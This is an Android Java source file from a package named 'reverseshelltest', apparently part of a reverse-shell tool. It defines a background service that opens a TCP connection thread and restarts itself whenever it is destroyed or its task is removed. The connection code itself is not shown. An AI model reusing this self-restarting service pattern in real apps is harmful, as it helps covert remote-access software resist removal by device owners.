package com.example.reverseshelltest;



import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.SystemClock;

public class SocketService extends Service {

Intent intent_removed=null;

    public SocketService(){

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if(intent_removed == null) {
            intent_removed = intent;
        }
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onCreate() {
        System.out.println("On create");
        super.onCreate();
        Thread thread = new Thread(new TCPConnection());
        thread.start();
    }

    @Override
    public void onDestroy() {
        System.out.println("on destroy");
        super.onDestroy();
        getBaseContext().startService(new Intent(getBaseContext(),SocketService.class));

    }

    @Override
    public void onTaskRemoved(Intent rootIntent){
        System.out.println("ON task removed call");
        Intent intent = new Intent( this, this.getClass() );
        intent.addFlags( Intent.FLAG_ACTIVITY_NEW_TASK );
        startActivity(intent);
        super.onTaskRemoved(rootIntent);
    }
}
